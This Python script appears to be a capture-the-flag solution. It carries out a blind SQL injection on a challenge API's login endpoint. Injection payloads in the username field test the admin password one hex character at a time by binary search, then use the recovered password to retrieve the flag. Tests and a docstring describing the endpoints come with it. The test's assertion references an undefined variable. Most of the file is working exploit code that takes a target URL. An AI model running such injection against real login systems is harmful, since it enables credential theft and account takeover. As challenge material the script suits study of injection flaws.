"""Flag api key


API
---
/api/login

Methods: OPTIONS POST
Arguments: None
Description: User login endpoint
POST data: username, password, api
Example Data: username=admin&password=4764fe68c18380e2dbc0bccbdc862691&api=06c6e1d3fae974defb8ee5f59c471bf2


/api/token
Methods: GET, HEAD, OPTIONS
Arguments: None
Description: Request an API token valid for 128 requests (will also reset the admin's password)


/api/get_flag
Methods: OPTIONS POST 
Arguments: None 
Retrieve the flag (invalid password will reset the admin's password)
POST data: password
Example data: password=4764fe68c18380e2dbc0bccbdc862691


Strategy
--------
The script uses binary search to guess(search) the character in each position. Since the character set of hex
is 16, we should approximately utilize 4 (log2(16)) API calls to check the character for a position. Since the
pasword is of length 32, we have a limit of 32x4 = 128 API calls.


Running
-------

    poetry run python main.py <url> # run against the API
    poetry run pytest main.py -v    # run the tests
"""


import json
import argparse
import requests

from typing import Callable


MAX_CALLS = 128


class Guess:
    charset = [
        "0",
        "1",
        "2",
        "3",
        "4",
        "5",
        "6",
        "7",
        "8",
        "9",
        "a",
        "b",
        "c",
        "d",
        "e",
        "f",
    ]

    def __init__(self, is_between: Callable, is_equal: Callable):
        self.is_between: Callable = is_between
        self.is_equal: Callable = is_equal
        self.low: int = 0
        self.high: int = 0
        self.mid: int = 0
        self.password: str = ""
        self.calls = 0

    def reset(self) -> None:
        self.low = 0
        self.high = len(Guess.charset) - 1
        self.mid = int((self.high - self.low) / 2)

    def set_pass_and_reset(self, c: str) -> None:
        self.password += c
        self.reset()

    def check_equality(self, i: int, a: int, b: int) -> None:
        ok, self.calls = self.is_equal(i, Guess.charset[a]), self.calls + 1
        self.set_pass_and_reset(Guess.charset[a] if ok else Guess.charset[b])

    def check_is_between(self, i: int, a: int, b: int) -> bool:
        self.calls += 1
        return self.is_between(i, Guess.charset[a], Guess.charset[b])

    def binsearch(self) -> str:
        curr_pos = 1  # first index is 1 strings in SQlite
        while len(self.password) < 32:
            if self.high - self.low == 1:
                self.check_equality(curr_pos, int(self.high), int(self.low))
                curr_pos += 1
                continue
            ok = self.check_is_between(curr_pos, self.low, self.mid)
            if ok:
                if self.mid - self.low == 1:
                    self.check_equality(curr_pos, int(self.low), int(self.mid))
                    curr_pos += 1
                    continue
                self.high = self.mid
                self.mid = (
                    self.low
                    if (self.mid - self.low) == 1
                    else int((self.mid + self.low) / 2)
                )
            else:
                if self.high - self.mid == 1:
                    self.check_equality(curr_pos, int(self.high), int(self.mid))
                    curr_pos += 1
                    continue
                self.low = self.mid + 1
                self.mid = (
                    self.high
                    if (self.high - self.mid) == 1
                    else int((self.high + self.mid) / 2)
                )
        return self.password

    def guess(self) -> str:
        self.reset()
        return self.binsearch()


class FlagApi:
    def __init__(self, url: str):
        self.url = url
        self.api_url = f"{url}/api"
        self.token_url = f"{self.api_url}/get_token"
        self.login_url = f"{self.api_url}/login"
        self.flag_url = f"{self.api_url}/get_flag"
        self.session = requests.Session()
        self.token = ""

    def get_token(self):
        resp = self.session.get(self.token_url)
        if not resp.ok:
            print(f"status: {resp.status_code} error: {resp.text}")
        self.token = resp.json()["message"].split()[-1][:-1]  # remove exclamation mark
        return self.token

    def login(self, data: dict):
        resp = self.session.post(self.login_url, data=data)
        if not resp.ok:
            print(f"status: {resp.status_code} error: {resp.text}")
            raise
        return resp.json()

    def get_flag(self, data):
        resp = self.session.post(self.flag_url, data=data)
        if not resp.ok:
            print(f"status: {resp.status_code} error: {resp.text}")
            raise
        return resp.json()

    def is_between(self, i: int, a: str, b: str) -> bool:
        data = {
            "username": f"admin' and substr(password,{i},1) between '{a}' and '{b}'--",
            "password": "abc",
            "api": self.token,
        }
        try:
            resp = self.login(data)
        except Exception as err:
            print(f"exception: {err}")
            return False

        return True if resp["result"] == "success" else False

    def is_equal(self, i: int, a: str) -> bool:
        data = {
            "username": f"admin' and substr(password,{i},1) == '{a}'--",
            "password": "abc",
            "api": self.token,
        }
        try:
            resp = self.login(data)
        except Exception as err:
            print(f"exception: {err}")
            return False

        return True if resp["result"] == "success" else False


def parser() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Script to exploit SQlite vulnerability in the app",
    )
    parser.add_argument("url", metavar="url", help="challenge url")

    args = parser.parse_args()
    return args


def main(url: str):
    api = FlagApi(url)
    api.get_token()

    print(f"API Key: {api.token}")

    g = Guess(api.is_between, api.is_equal)

    g.guess()
    print(f"Guessed: {g.password} total api calls: {g.calls}")
    flag = api.get_flag(data={"password": g.password})

    print(f"Flag   : {flag['message']}") if flag["result"] == "success" else print(
        f"error: getting flag: {flag}"
    )


if __name__ == "__main__":
    args = parser()
    main(args.url)


import pytest


@pytest.mark.parametrize(
    "testcase",
    [
        "af9016534b28469b707529243ffc9c36",
        "45cd4545454545454545454545454545",
        "4764fe68c18380e2dbc0bccbdc862691",
        "5d7edf0e0766a485beb4c300da7ad083",
        "eba54079f189dd2a47f0aa25d658e934",
        "ed93fa4b93b97c352c1bfb496c90ff04",
    ],
)
def test_guess(testcase: str):
    def is_between(i: int, a: str, b: str) -> bool:
        return a <= testcase[i - 1] <= b

    def is_equal(i: int, a: str) -> bool:
        return a == testcase[i - 1]

    g = Guess(is_between, is_equal)

    g.guess()

    assert g.password == testcase and s.calls <= MAX_CALLS
